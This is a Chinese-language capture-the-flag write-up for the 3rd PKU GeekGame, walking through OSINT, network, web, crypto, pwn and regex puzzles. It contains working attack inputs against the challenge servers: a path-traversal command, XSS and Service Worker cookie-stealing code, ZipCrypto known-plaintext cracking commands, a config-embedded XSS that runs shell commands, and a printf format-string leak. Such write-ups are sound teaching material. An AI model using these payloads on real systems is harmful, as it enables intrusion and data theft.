# GeekGame 3rd Writeup

## 一眼盯帧

一看标题，马上保存图片，找了一个[在线服务](https://ezgif.com/split)，处理完发现只有
2 帧。原来题目描述跟附件的图片不一样，还以为动态视力太差。抄下来之后 ROT13
就能得到 flag。

## 小北问答!!!!!

一看描述，我去，我去!!!!! 要素太多了，好き。

这题是我打第 5 场 CTF 唯一一道一血，哈哈（。

1. 在北京大学（校级）高性能计算平台中，什么命令可以提交一个非交互式任务？

    [答案格式： `^[a-z]+$`](https://regexper.com/#%5E%5Ba-z%5D%2B%24)

    搜索找到 <https://hpc.pku.edu.cn/>，一顿乱点可以在 使用教程 - 快速入门 里看到是
    sbatch。

2. 根据 GPL 许可证的要求，基于 Linux
   二次开发的操作系统内核必须开源。例如小米公司开源了 Redmi K60 Ultra
   手机的内核。其内核版本号是？

    [答案格式： `^\d+\.\d+\.\d+$`](https://regexper.com/#%5E%5Cd%2B%5C.%5Cd%2B%5C.%5Cd%2B%24)

    搜索找到代码仓库 <https://github.com/MiCode/Xiaomi_Kernel_OpenSource>
    ，查找并打开指定型号的分支。记得每次 Linux 升版本号时 Linus 都会提交一个很小的
    commit，随便看一个就能知道版本号在 Makefile 里。

    ```shell
    git show v5.4
    # diff --git a/Makefile b/Makefile
    ```

3. 每款苹果产品都有一个内部的识别名称（Identifier），例如初代 iPhone 是
    `iPhone1,1`。那么 Apple Watch Series 8（蜂窝版本，41mm 尺寸）是什么？

    [答案格式： `^[a-zA-Z]+\d+,\d+$`](https://regexper.com/#%5E%5Ba-zA-Z%5D%2B%5Cd%2B%2C%5Cd%2B%24)

    搜索 `"iPhone1,1"` （注意双引号），可以找到别人整理的
    [列表](https://gist.github.com/adamawolf/3048717)。

4. 本届 PKU GeekGame 的比赛平台会禁止选手昵称中包含某些特殊字符。截止到 2023 年
   10 月 1 日，共禁止了多少个字符？（提示：本题答案与 Python
   版本有关，以平台实际运行情况为准）

    [答案格式： `^\d+$`](https://regexper.com/#%5E%5Cd%2B%24)

    在比赛页面底部“开放源代码”里面有代码仓库地址，搜索可以找到对应的
    [代码](https://github.com/PKU-GeekGame/gs-backend/blob/2a1b6743559b95a534e186c4e170eab6b8de5400/src/store/user_profile_store.py#L64)
    。把 [相关代码](./02-小北问答!!!!!/main.py)
    复制出来，安装依赖，执行即可得到答案……如果你运气足够好的话。

    当时好不容易熬过了第一个 3600s 冷却时间，一提交发现 6 道题只对了 4
    道，而且不知道是哪道错了，两眼一黑。其中 #1 和 #2
    第一次小孩子不懂事瞎提交的时候已经确定正确，#3 最肯定，#4 和 #6
    不太肯定但也看不出问题，#5 发现可能是大小写的问题（不久后改成大小写都对了），
    于是打算先单改 #5 看看。

    CD 快好时突然想起可能跟 Python 版本有关。用 3.11.5 Docker 镜像执行得到
    `4587`，确实跟 3.10.4 的 `4472` 不同。然而提交还是不对。

    在项目 README 可以看到要求版本是 >= 3.8。Python 3.12 是 10 月 2
    日才发布的。看了 Git 历史，相关代码在 10 月 1 日后也没有改动。这时剩下 3.8 和
    3.9，因为 3.8 是最低要求版本，而且还是
    [最后一个](https://www.python.org/downloads/release/python-390/) Windows 7
    支持比较好的版本，就猜了 3.8，结果对了。

    至于为什么我会想到跟 Python 版本有关？因为我日常桌面用的是
    Windows，在网上冲浪时经常遇到 emoji 显示成方框的情况，就写了个简单的脚本，用
    `unicodedata` 看名字。开赛前不久遇到了位于 [Geometric Shapes
    Extended](https://www.unicode.org/charts/PDF/U1F780.pdf) 的 `'\U0001f7f0'`
    [Heavy Equals Sign](https://unicodeplus.com/U+1F7F0)，Python 3.8 和 3.10
    都抛 ValueError，换成前述的 3.11.5 才解决，发现是因为 `unidata_version`
    不同。这个字符比较新，某老版本 iOS 14 也不显示，iOS 15 正常。

    后来看到有人暴力枚举，才想到可以真的去修改昵称，用版本间新增的字符去测试，
    这样就不用猜了。

5. 在 2011 年 1 月，Bilibili 游戏区下共有哪些子分区？（按网站显示顺序，以半角逗号分隔）

    [答案格式： `^[A-Za-z一-龟-,]+$`](https://regexper.com/#%5E%5BA-Za-z%E4%B8%80-%E9%BE%9F%C2%B7%2C%5D%2B%24)

    马上打开 Wayback machine。

    <https://web.archive.org/web/20110104010246/http://www.bilibili.com/>

    ```plaintext
    Directory Listing Denied
    This Virtual Directory does not allow contents to be listed.
    ```

    想到前身是 MikuFans，上维基看了下，原来当时用的是另一个域名。

    <https://web.archive.org/web/20110105131103/http://bilibili.us/>

    点游戏区就能看到。一个小坑是 `Flash游戏` 在顶部和正文里大小写不一致。

6. [这个照片](https://prob18.geekgame.pku.edu.cn/static/osint-challenge.jpg)
   中出现了一个大型建筑物，它的官方网站的域名是什么？
   （照片中部分信息已被有意遮挡，请注意检查答案格式）

    [答案格式： `^[a-z0-9-]+\.[a-z0-9]{2,3}$`](https://regexper.com/#%5E%5Ba-z0-9-%5D%2B%5C.%5Ba-z0-9%5D%7B2%2C3%7D%24)

    搜索 `清华科技园 启迪控股 中关村 KONZA`，可以找到一篇
    [新闻](http://www.iaspbo.com.cn/contents/2/533)。

    一开始以为问的是大会的官网，提交之前仔细读了读才发现是建筑物的官网，赶紧打开一顿找。
    这时又误以为建筑物就是会场，当时网站加载还特别慢，找了半天没找到。最后发现在
    [Social events](https://www.iaspworldconference.com/destination/social-events/)
    第一张图就是。结合图片文件名和描述可以确定建筑是 `Philharmonie Luxembourg`。

    这里有一个小坑。搜索引擎结果是 `www.philharmonie.lu`，直接访问
    `philharmonie.lu` 也会 HTTP 302 跳转，但是正则表达式要求的是二级域名（
    top-level domain 下的 [second-level
    domain](https://en.wikipedia.org/wiki/Second-level_domain)）。

## Z 公司的服务器

附件是 pcapng，内容很干净。用 Wireshark 打开，Follow TCP Stream，搜索开头的 `rz`
能找到 <https://linux.die.net/man/1/rz>。

安装 `lrzsz`，一边读手册一边测试。一边 `sz --tcp-server` 一边 `rz --tcp-client`
可以成功传输。问题是平台需要输入token，而且协议是双向通讯的不能直接 pipe。

于是写了一个 [Python 脚本](./03-Z%20公司的服务器/forward.py)，先发
token，然后转发剩余流量。一开始怎么都不工作，`rz`创建了 `flag.txt`
又马上删掉了，以为是题目故意的。strace tcpdump 一顿查之后发现是脚本有 bug。

第二问比第一问容易。在 Wireshark 里把 server 发的内容另存出来，`nc`
重放一下就能得到一张 jpg。

```shell
nc -l -p 3333 < server.bin
rz --tcp-client 127.0.0.1:3333
```

写题解时搜了一下，发现可以用 `mkfifo` 或者 `tail -f` 将两个进程的 `stdin` 和
`stdout` 连起来，感觉有时能用上。

<https://stackoverflow.com/a/72652706>

```shell
rm -f fifo; mkfifo fifo
cat token.txt fifo | nc prob05.geekgame.pku.edu.cn 10005 | rz > fifo
touch tempfile
tail -q -f token.txt tempfile | nc prob05.geekgame.pku.edu.cn 10005 | rz > tempfile
```

## 猫咪状态监视器

下载 Docker 镜像，看了一下 `/usr/sbin/service` 的内容跟其他 Debian 是一样的。先读
manual，没什么有用的信息。搜索了一下也没什么漏洞报告，大概都默认只有管理员才能执行。

`server.py` 直接用用户输入运行了 `"/usr/sbin/service {}
status".format(service_name)`。以为是 shell injection，一番阅读和测试后发现
`shell=False` 时没有这个问题。

开始读 `/usr/sbin/service`。大多数分支都不会进去或者没做什么危险操作，只有
`run_via_sysvinit` 调用了 `"$SERVICEDIR/$SERVICE"`，把剩余参数传了过去。
猜测现有服务在传某些参数时可能有可以利用的漏洞。`$SERVICEDIR` 是
`/etc/init.d`，里面只有一个 `hwclock.sh`，在我的电脑上执行会报 `No usable clock
interface found.`，在平台上则正常运行，我猜这是特地准备的。
然而又一番阅读和测试后，我发现这个脚本很安全。

后来回去看 `/usr/sbin/service`，发现 `"$SERVICEDIR/$SERVICE"` 可以 path
traversal，只是最后会带一个 `status`。那就好办了。

```plaintext
Command: STATUS
Service name: ../../bin/cat /flag.txt
```

## 基本功

解压后有两个加密的 Zip 文件，先看看详情。

```shell
7z l -slt challenge_1.zip
# Path = chromedriver_linux64.zip
# Method = ZipCrypto Store
# Path = flag1.txt
# Method = ZipCrypto Store
7z l -slt challenge_2.zip
# Path = flag2.pcapng
# Method = ZipCrypto Store
```

都是 `ZipCrypto Store`。看到 `chromedriver_linux64.zip` 就有预感了，看了
[Wikipedia](https://en.wikipedia.org/wiki/ZIP_(file_format)#Encryption)
果然有 known-plaintext attack。

直接搜索 `chromedriver_linux64.zip` 和文件大小 `5845152`，可以找到历史版本列表
<https://chromedriver.storage.googleapis.com/>，版本是 `89.0.4389.23`。到
<https://chromedriver.chromium.org/downloads> 下载。

搜索可以找到 <https://github.com/kimci86/bkcrack>。文档写得一般，配合测试勉强能看懂。
先用已知明文解出密钥，再用密钥解密其他文件。隐含假设是一个 Zip 文件里面的文件密钥相同。

```shell
bkcrack-1.5.0-win64\bkcrack.exe -C prob24\challenge_1.zip -c chromedriver_linux64.zip -p chromedriver_linux64.zip
# [12:52:11] Keys
# cfe9418e 871f8490 87b8cede
bkcrack-1.5.0-win64\bkcrack.exe -C prob24\challenge_1.zip -c flag1.txt -k cfe9418e 871f8490 87b8cede -d flag1.txt
# Wrote deciphered data.
```

第二问只有一个 pcapng 文件。对比前面 rz 题和自己抓的包，可以看出结尾前 0x54
个字节的位置内容都是 `Counters provided by dumpcap`，可以满足 12
个字节的要求。算好偏移再来一次就能解密。

```shell
7z l -slt challenge_2.zip
# Path = flag2.pcapng
# Size = 70368
echo $((70368 - 84))
# 70284
printf "Counters provided by dumpcap" | xxd -p
# 436f756e746572732070726f76696465642062792064756d70636170
bkcrack-1.5.0-win64\bkcrack.exe -C prob24\challenge_2.zip -c flag2.pcapng -x 70284 436f756e746572732070726f76696465642062792064756d70636170
bkcrack-1.5.0-win64\bkcrack.exe -C prob24\challenge_2.zip -c flag2.pcapng -k b468b6ab 3bcab91d b1cfb875 -d flag2.pcapng
```

解密出来的 pcapng 是裸 HTTP，直接看响应就行。

做完随手看了下，7-Zip 直到最新版 23.01 右键菜单的 Zip 格式默认还是
`ZipCrypto`，喷了。

## 麦恩·库拉夫特

下载，看教程。台阶好难跳，讲台右键没反应但客户端会报错。
旁边石头能阅读，以为是要砸掉上面的砖然后用命令方块读讲台的书。
瞎折腾了一顿，没搞明白要怎么读书。

进旁边的洞穴逛了逛，也没发现什么。就算开着创造模式，离开洞穴也很费劲。

玩了一会感觉很晕，强忍着又玩了一会，感觉快吐了。

问了 LLM，它列了几类要注意的东西，但我就是找不到啊。

第二阶段看了提示，找到了 <https://github.com/jaquadro/NBTExplorer>，打开存档搜索
value 包含 `flag{` 的内容就能拿到前两个 flag。

## Emoji Wordle

Level 1 答案固定，直接[暴力](./08-Emoji%20Wordle/1.py)。如果有黄色的从出现过黄色的
emoji 随机，没有就从见过的 emoji 随机。大概 30 多次能完成。

Level 2 说是答案存储在会话中，一看 cookies 的 `PLAY_SESSION` 规律明显，base64
解码就能得到 flag。搜索了前面的内容，原来是 JWT。

Level 3 的 `PLAY_SESSION` 解出来有开始时间、剩余次数和随机种子，限时一分钟。这时搜到
JWT 弱密钥可以暴力破解，以为是破解后自己签名，重复用同一个随机种子。
后来试了一下，原来服务器连剩余次数也没存。改一下脚本，把第一次访问获得的
`PLAY_SESSION` 存起来重复使用就行。

## 第三新XSS

题目提供一个服务，可以在指定路径下保存内容，连 HTTP header
都能指定。自由度高到可以在上面架设网站了.

第一问 bot 先访问 `/admin/`，把 flag 存到 cookies 里并设置了
`path=/admin`，然后访问指定 URL 打印标题。用 iframe 嵌一个 `/admin/` 然后读 cookies
就行。

```html
<iframe id="iframeId" src="/admin/"></iframe>
<script>
    // https://stackoverflow.com/questions/30067870/accessing-cookies-of-an-iframe-in-parent-window
    setTimeout(() => {
        let cookie = document.getElementById("iframeId").contentDocument.cookie;
        document.title = /.*(flag=[^;]+).*/.exec(cookie)[1];
    }, 500);
</script>
```

第二问 bot 先访问指定 URL，重启浏览器后再访问 `/admin/`。
先访问的页面居然影响到了后访问的、基本上什么都没有的页面，难道有什么严重漏洞？

第一阶段快结束时想到了 Service Worker，但没什么把握而且需要时间不好估计，就没做。
第二阶段提示出来，果然是 Service Worker，有点后悔。

直接把 MDN
[官方示例](https://github.com/mdn/dom-examples/tree/main/service-worker/simple-service-worker)
clone 下来，在上面的基础改。

Service Worker 返回的内容需要加 `Content-Type: text/html`，否则浏览器会贴心地用
`<pre>` 包住。

然后控制台报错：

```plaintext
Registration failed with SecurityError: Failed to register a ServiceWorker for
scope ('https://prob99-4urnfrc7.geekgame.pku.edu.cn/') with script
('https://prob99-4urnfrc7.geekgame.pku.edu.cn/sw/sw.js'): The path of the
provided scope ('/') is not under the max scope allowed ('/sw/'). Adjust the
scope, move the Service Worker script, or use the Service-Worker-Allowed HTTP
header to allow the scope.
```

MDN 文档说 Service Worker 不能控制上级和兄弟目录的页面，需要加
`Service-Worker-Allowed` HTTP 响应头。然而 MDN
没有说具体要设置成什么值，简单搜了一下也没找到。

试了下改路径，`/sw/` 不行，`/sw` 会被重定向也不行。

<https://stackoverflow.com/questions/49084718/how-exactly-add-service-worker-allowed-to-register-service-worker-scope-in-upp>

原来是要给每个响应都加上 `Service-Worker-Allowed: /`。

```html
<script type="module" src="/app/app.js"></script>
```

```json
{"Content-Type": "text/html", "Service-Worker-Allowed": "/"}
{"Content-Type": "application/javascript", "Service-Worker-Allowed": "/"}
```

```diff
diff --git a/service-worker/simple-service-worker/app.js b/service-worker/simple-service-worker/app.js
index 72472bf..cf146ce 100644
--- a/service-worker/simple-service-worker/app.js
+++ b/service-worker/simple-service-worker/app.js
@@ -1,12 +1,11 @@
-import { Gallery } from './image-list.js';

 const registerServiceWorker = async () => {
   if ('serviceWorker' in navigator) {
     try {
       const registration = await navigator.serviceWorker.register(
-        'sw.js',
+        '/sw/sw.js',
         {
-          scope: './',
+          scope: '/',
         }
       );
       if (registration.installing) {
@@ -53,4 +52,3 @@ const createGalleryFigure = async (galleryImage) => {
 };

 registerServiceWorker();
-Gallery.images.map(createGalleryFigure);
diff --git a/service-worker/simple-service-worker/sw.js b/service-worker/simple-service-worker/sw.js
index 0d4fae5..7392810 100644
--- a/service-worker/simple-service-worker/sw.js
+++ b/service-worker/simple-service-worker/sw.js
@@ -9,6 +9,13 @@ const putInCache = async (request, response) => {
 };

 const cacheFirst = async ({ request, preloadResponsePromise, fallbackUrl }) => {
+  return new Response(
+    `<title>fake</title><script> setTimeout(() => { document.title = document.cookie; }, 800); </script>`,
+    {
+      status: 200,
+      headers: { 'Content-Type': 'text/html' }
+    }
+  );
   // First try to get the resource from the cache
   const responseFromCache = await caches.match(request);
   if (responseFromCache) {
@@ -58,19 +65,6 @@ self.addEventListener('activate', (event) => {
 });

 self.addEventListener('install', (event) => {
-  event.waitUntil(
-    addResourcesToCache([
-      './',
-      './index.html',
-      './style.css',
-      './app.js',
-      './image-list.js',
-      './star-wars-logo.jpg',
-      './gallery/bountyHunters.jpg',
-      './gallery/myLittleVader.jpg',
-      './gallery/snowTroopers.jpg',
-    ])
-  );
 });

 self.addEventListener('fetch', (event) => {
```

顺便一提扩展 [ArchiveWeb.page](https://github.com/webrecorder/archiveweb.page)
的回放功能也是用 Service Worker 实现的。虽然有些网页会有问题，比如知乎专栏。
有网页存档需求的网友可以用用看。

## 简单的打字稿

以前没学过类似的语言，全靠乱搞。我跟编译器打起来了.jpg

代码是在 <https://www.typescriptlang.org/play/>
上写的，有自动补全、鼠标悬停显示类型和自动类型检查，很好用。

首先想到实例化一个对象然后打印。又查又写折腾了好一会，无果。`index.ts`
没给读文件的权限，尝试修改 `stderr` 把 `flag` 替换掉也不成功。
剩下只能让原始的报错就不包含 `flag` 了。

一顿翻文档，找到
<https://www.typescriptlang.org/docs/handbook/utility-types.html>，
但是只能改变大小写，而出题人已经预判到了，用的忽略大小写的正则表达式。

想了很久，突然想到如果用 [Template Literal
Types](https://www.typescriptlang.org/docs/handbook/2/template-literal-types.html)
，在前缀匹配时交集是 flag 本身，前缀不匹配时是空集 never。测试了一下确实是这样。
又花了一些时间，找到了检查类型是否为 `never` 的
[方法](https://stackoverflow.com/questions/65492464/typescript-never-type-condition)。

```typescript
type fake = 'fake{abc}'
type s = string;
type check = fake & `fake{a${s}`;
type TypeCond<T> = [T] extends [never] ? 1 : 2;
let x : TypeCond<check> = 1;
// error: TS2322 [ERROR]: Type '1' is not assignable to type '2'.
// let x : TypeCond<check> = 1;
//     ^
//     at file:///app/$deno$stdin.ts:8:5
```

这样当前缀匹配时，编译器会报错。写一个 [脚本](./10-简单的打字稿/main.py) 逐位爆破就行。

第二问的类型比较复杂。通过
[Narrowing](https://www.typescriptlang.org/docs/handbook/2/narrowing.html) 和
[Parameters\<Type\>](https://www.typescriptlang.org/docs/handbook/utility-types.html#parameterstype)
可以比较轻松地得到 b: `{ 'flag{...}': never } & Record<string, string>`。
接下来是卡最久的地方，要把 `'flag{...}'` 从这个 b 分离出来。

一种想法是构造一个相似的类型，然后用 `extends` 来判断，没写出来。Narrowing、Omit 和
keyof 看起来都挺好，就是不能满足需求。

实际上做题的时候并不知道 `{ 'flag{...}': never }` 是什么意思。翻到了 [Type Cheat
Sheet](https://www.typescriptlang.org/static/TypeScript%20Types-ae199d69aeecf7d4a2704a528d0fd3f9.png)。

```typescript
type Location = { x: number } & { y: number }
// { x: number, y: number }
```

有一点帮助，但还是完全没搞懂。

又翻了很久，在 [一个回答](https://stackoverflow.com/a/63991735)
里看到了根据值的类型筛选的写法，赶紧抄过来。

```typescript
type KeyToNever<T> = { [K in keyof T as [T[K]] extends [never] ? K : never]: 1 };
type l = KeyToNever<b>;
// { 'flag{...}': 1 }
type ll = keyof l;
// 'flag{...}'
```

然后重复跟 flag1 相同的操作即可。

写题解时看到群友说 LLM 能解 flag1，试了一下确实可以，而且是更优的解法。

```plaintext
Below is a typescript snippet. User submitted code will be appended, and the
whole script will be executed. stdout and stderr will be output, but the output
can not contain string "flag". How to obtain the secret content of flag1?

type flag1 = 'flag{...}'

// your code here
```

```typescript
type flag1 = 'flag{...}';

type SecretContent<T> = T extends `flag${infer Content}` ? Content : never;

// Usage example
type Secret = SecretContent<flag1>;
console.log('Secret content:', Secret);
```

`console.log` 是错的，直接 let 一个对象就能报错将 flag 内容打印出来。

## 逝界计划

一开始以为是用 Jinja 读文件，看到一阶段提示说要用集成，而且通过人数很少，就没做。

二阶段提示出来后知道了是 nmap。搜索到
[nmap 集成地址](https://www.home-assistant.io/integrations/nmap_tracker/)
和 [集成文档](https://www.home-assistant.io/getting-started/integration/)，
成功添加了 nmap 集成。

nmap 和 device_tracker 都看不到什么有用信息。在本地装 nmap 读
manual。开头就是能读文件的 `-iL <inputfilename>: Input from list of
hosts/networks`。在本地测试一下。

```shell
nmap -iL flag.txt
# Failed to resolve "fake{123}".
# WARNING: No targets were specified, so 0 hosts scanned.
# Nmap done: 0 IP addresses (0 hosts up) scanned in 0.02 seconds
```

确实能输出。但填到配置里面之后 Home Assistant 什么反应都没有。

另一个思路是让 nmap 认为这个 `flag{...}` 确实在线，由 Home Assistant
显示出来。一顿测试没成功。毕竟这确实不是个合法的 target。

再另一个思路是用 nmap 的输出写文件，然后让 Home Assistant
直接或者通过报错显示出来。这个需要比较了解 Home Assistant，没尝试。

找到了 nmap_checker 的
[代码](https://github.com/home-assistant/core/blob/dev/homeassistant/components/nmap_tracker/__init__.py)，
做题的时候没细看。

在 Home Assistant
[文档](https://www.home-assistant.io/docs/configuration/troubleshooting/)
看到可以开 Debug Logging，大喜。下载下来一看，logging level 是开到 DEBUG
了，但还是没有 stderr，这算什么 Debug Logging？

```plaintext
2023-10-19 08:37:36.197 DEBUG (SyncWorker_0) [homeassistant.components.nmap_tracker] Scanning ['172.19.0.0/16'] with args: -iL /flag.txt --exclude 172.19.0.3 --reason -v
2023-10-19 08:37:41.265 DEBUG (SyncWorker_0) [homeassistant.components.nmap_tracker] Finished scanning ['172.19.0.0/16'] with args: -iL /flag.txt --exclude 172.19.0.3 --reason -v
```

这时已经读了很久 nmap manual，有点自暴自弃了，干脆试试 output format。`-oX`
会抛异常，`-oN` 和 `-oG` 都没特别的输出，`-oS` 可以抛出 PortScannerError 让 Home
Assistant 把 flag log 出来。

```plaintext
2023-10-19 10:03:18.474 DEBUG (SyncWorker_0) [homeassistant.components.nmap_tracker] Scanning ['172.19.0.0/31'] with args: -F -T4 --min-rate 10 --host-timeout 5s -Pn -iL /flag.txt -oS - --exclude 172.19.0.1 --reason -v
2023-10-19 10:03:23.542 ERROR (MainThread) [homeassistant.components.nmap_tracker] Nmap scanning failed: 'Failed to resolve "flag{sOOoo-mAny-LOoPhOLes-iN-hOme-AsSistant}".\nWARNING: No targets were specified, so 0 hosts scanned.\n'
```

## 非法所得

读了题面，这下不得不做了。

题目运行了一个 cfw，提供几个控制的接口，主要是从指定 URL 导入配置，一个只能看
cfw 界面的 VNC，还有一个访问指定 URL 并返回截图的服务。

主要的代码在 `app/prepare_flag.mjs` 和 `app/ui/index.mjs`。阅读可知 flag1 在
`/app/profiles/flag.yml`，flag2 不在文件系统，只有在访问的域名为 `ys.pku.edu.cn`
时会输入到 `#primogem_code[type=password]` 中，flag3 在 `/flag`，只能用
`/app/readflag` 读取。

这题的环境可以访问公网，感觉很容易被滥用。配置文件可以传到 第三新XSS 那题。

读文档发现了 [Script](https://dreamacro.github.io/clash/premium/script.html)
好像能执行 Python 代码。尝试用 tkinter 显示一个窗口并前置，没成功。

flag1 和 flag3 没什么头绪，先看 flag2。这题需要页面上有一个
`#primogem_code[type=password]` 元素，而且在截图时要能显示明文。找到一个
[示例配置](https://lancellc.gitbook.io/clash/clash-config-file/an-example-configuration-file)
里面有 hosts，可以将 `ys.pku.edu.cn` 解析到指定 IP。测试了 第三新XSS 的服务，`HOST`
头不对会返回 HTTP 404，只能找个公网的服务器了。HTTP 服务我用的是 Python 的
`http.server`。

```yaml
mode: rule

hosts:
  # Enter IP of the server
  'ys.pku.edu.cn': 8.8.8.8
```

```html
<input id="primogem_code" type="password" style="width: 300px" />
<script>
    setTimeout(() => {
        document.getElementById("primogem_code").type = "input";
    }, 3000);
</script>
```

写题解时看到有人直接在题目环境里用 Node.js 开了 HTTP 服务。

看了二阶段提示，可以 RCE，太棒了。还是想试试不借助自己控制的服务器把结果传出来。
pastebin 是公开的不太好，一时半会不好找 API 比较简单的服务。这时想到可以调用本机的
`/api/import` 接口，显示在图形界面上。测试发现效果很好，cfw 会在错误弹窗里显示完整
URL，而且不影响下次 import。因为都是执行命令显示输出，flag1 和 flag3 的代码基本一样。

```yaml
mode: Rule
proxies:
  - name: normal
    type: socks5
    server: 127.0.0.1
    port: "17938"
    skip-cert-verify: true

proxy-groups:
  -
    name: a<img src="1" onerror="eval(`require('child_process').exec('grep flag /app/profiles/flag.yml', (_, o, __) => { require('http').get(('http://127.0.0.1:3030/api/import?url=' + encodeURIComponent('http://'+Buffer.from(o).toString('hex')+'.com')));});`)" />
    type: select
    proxies:
    - normal
```

## 汉化绿色版免费下载

打开附件，熟悉的 xp3。运行程序，熟悉的乱码，熟练地用 Locale-Emulator 中文 Profile
运行。是二进制高手都喜欢玩 gal game，还是喜欢玩 gal game 的人都变成了二进制高手？

先玩一下看看，输入两个 `}` 速通，显示的 flag1 看不清。

解包 xp3。试了 <https://github.com/awaken1ng/krkr-xp3>
会抛异常，<https://github.com/storycraft/xp3-tool>
工作正常。尝试直接把背景换成黑色重新打包，能看到一点底边，但还是看不清。

随手 `grep` 了一下，发现原来 flag1 就在 `scenario/done.ks` 里。

补充说明说 flag2 是存档里的输入序列。看了下存档，是二进制格式。
手打了几个存档来对比，完全看不懂。Cheat Engine 试了一下也搜不到。
看通过人数那么多，不像是需要逆向的。

回去看 ks 脚本，原来是 GBK 编码。游戏用输入的字符串计算
hash，比较是否相同。模仿着改了脚本，在游戏中显示变量内容。原来的文本在进入
round2 时已经被覆盖掉了，只剩 hash。

刚想暴力枚举，发现复杂度有点高，而且解不唯一，跟补充说明冲突。
补充说明说这种情况“漏掉了一些信息”，剩下的文件除了可执行程序以外，就只剩
`datas{c,u}.ksd` 了。

这两个文件也是 `file` 不认识的格式。搜索了一会，找到
<https://iyn.me/i/post-45.html>，原来是混淆后的脚本。用
<https://github.com/arcusmaximus/KirikiriTools> 中的 `KirikiriDescrambler.exe`
可以还原出明文。

在 `datasu.ksd` 中可以看出，`trail_round1_sel_x` 像是某个字母被选择的次数。AEIOU
分别是 6, 3, 1, 6, 0。算一下有多少种可能。

```python
from math import comb as c
c(16, 1) * c(15, 3) * c(12, 6)
# 6726720
```

看起来可以接受。写个 DFS 遍历一下。

```python
import typing

Mod = 19260817
Multiplier = 13337
Target_hash = 7748521
Counts = [6, 3, 1, 6]
Total_count = sum(Counts)

def dfs(h: int, remain: typing.List[int], current: typing.List[int]) -> None:
    if len(current) == Total_count:
        if (h * Multiplier + 66) % Mod == Target_hash:
            print(''.join('AEIO'[x] for x in current))
        return
    for i in range(len(remain)):
        if remain[i] == 0:
            continue
        current.append(i)
        remain[i] -= 1
        dfs((h * Multiplier + (i + 1) * 11) % Mod, remain, current)
        remain[i] += 1
        current.pop()

dfs(1337, Counts, [])
```

Python 要跑十几秒，还好这是 CTF 不是 CPC。

## 初学 C 语言

`printf` 是 [Variadic
function](https://en.cppreference.com/w/cpp/utility/variadic)，
可以接受数量不定的参数。根据 [Calling
convention](https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI)
，多出来的参数放在栈上。我们只需要在格式字符串里多塞 format specifier，`printf`
就会读取并打印栈上的内容。

`%p` 是其中比较好用实惠的，直接塞一堆进去，然后解码一下就行。

```python
int(p.paste(), 16).to_bytes(8, 'little')
# b'flag{rE4'
# b'd_PR1nTF'
# b'_c0De_So'
# b'_e4zY}\n\x00'
```

第二问第一阶段理解错了，以为平台上运行的代码在 `//get flag2 in another file` 有内容。

用前面的方法只能往高地址方向顺序读。我们可以用接受指针参数的 `%s`，因为指针高位字节是
0，所以只能放到末尾。地址中含有 `\n` 也会导致输入被截断。因为要输入特殊字符，改用
pwntools 连接。测试几遍调整位置之后可以写出（不太受控地）读任意地址的
[脚本](./14-初学%20C%20语言/main.py)。

然而扫描了附近几 KiB 的内容也没发现 flag2。猜测可能要从栈上读返回地址，
根据相对偏移读出读取 flag2 的代码。

提示出来后发现原来要用 `%n` 栈溢出。然而 attacklab 还没做，估计来不及。

## Baby Stack

必须用附件里的 loader 和 libc 才能运行。

```shell
./ld-linux-x86-64.so.2 --library-path ./ ./challenge1
```

出提示后，看了代码知道输入 0 会让程序出 bug 一直读取。应该是要栈溢出执行 `backdoor`。

用的 gdb，不知道怎样才能下断点。折腾了一顿发现可以在 `read` 的时候按 Ctrl +
C，在这个时候 `b *<address>`，虽然这时已经执行到中途了。

反汇编可以知道 `buffer` 在 `size` + 4 的位置，通过控制 `size` 的值可以确定
`buffer` 的地址。但是看了一下，`buffer` 后面都是 `0x7fff` 开头的地址，感觉不妙。

乱搞了一顿，试图把这些地址改成 `0x4011b6` 的
[endbr64](https://stackoverflow.com/questions/56905811/what-does-the-endbr64-instruction-actually-do)。
当然过程中保持节制，避免让 shell 读到垃圾。输入以后没出 shell
prompt，再回车就退出了。没拿到 flag。

## 绝妙的多项式

要用 Baby Stack 里的文件才能运行。`.data` 挺大。

```shell
size ./prob20-poly
#    text    data     bss     dec     hex filename
#   10166 4195104 2097736 6303006  602d1e ./prob20-poly
```

提示说 ChatGPT 可以帮助辨认信息，但是我没看到什么信息呀？`strings` 了也没找着。

## 关键词过滤喵，谢谢喵

为什么要把 harihikage.txt 放进测试集喵！

字数统计可以参考进制转换，每次将最低位取出来，剩下的右移一位喵。需要注意处理某一位为
0 的情况喵。

```plaintext
重复把【[^#]】替换成【#】喵
把【$】替换成【%】喵

干活：
  重复把【#{10}】替换成【@】喵
  把【%】替换成【#】喵
  把【#{10}】替换成【%9】喵
  把【#{9}】替换成【%8】喵
  把【#{8}】替换成【%7】喵
  把【#{7}】替换成【%6】喵
  把【#{6}】替换成【%5】喵
  把【#{5}】替换成【%4】喵
  把【#{4}】替换成【%3】喵
  把【#{3}】替换成【%2】喵
  把【#{2}】替换成【%1】喵
  把【#{1}】替换成【%0】喵
  重复把【@】替换成【#】喵
  如果看到【#】就跳转到【干活】喵

把【%】替换成【】喵
谢谢喵
```

flag2 我用的就是提示的方法，先把内容复制一份分隔开，每次删除一个字符，空的行移到前面喵。
注意启用 MULTILINE 模式喵。用 Unicode surrogate pair 的 emoji 真难编辑😡喵。

```plaintext
把【$】替换成【\n】喵
重复把【(?m:^\n)】替换成【】喵
重复把【(?m:^(?!.*✂️剪切线✂️)(.+)$)】替换成【\1✂️剪切线✂️\1】喵
重复把【(?m:(^.*✂️剪切线✂️.+\n)(^.*✂️剪切线✂️\n))】替换成【\2\1】喵

干活：
  如果没看到【(?m:✂️剪切线✂️.+$)】就跳转到【了解!!散!!!】喵
  重复把【✂️剪切线✂️[^🥒\n]】替换成【✂️剪切线✂️🥒】喵
  重复把【🥒】替换成【】喵
  重复把【(?m:(^.*✂️剪切线✂️.+\n)(^.*✂️剪切线✂️\n))】替换成【\2\1】喵
  如果看到【^】就跳转到【干活】喵

了解!!散!!!：
  重复把【✂️剪切线✂️】替换成【】喵
  谢谢喵
```

flag3 啪的一下就搜到了 <https://github.com/Tegmen/RegEx-Brainfuck-Interpreter>
喵。只用一条正则表达式替换实现，太神奇了喵。尝试移植到 Python，替换字符串里的
`(?{ code })` 这里是分支选择，勉强还能处理喵。查找模式的 `(?-2)`
用来匹配嵌套的循环，Python 会报 `cannot refer to an open group`
喵。这个不是有限状态自动机喵。

想了一下，可以模仿这个实现，左右移动改成上下移动，用一个 emoji 充当
PC，打表实现实现输出喵。循环可以从最内层开始标记，找到匹配括号后再删掉标记喵。
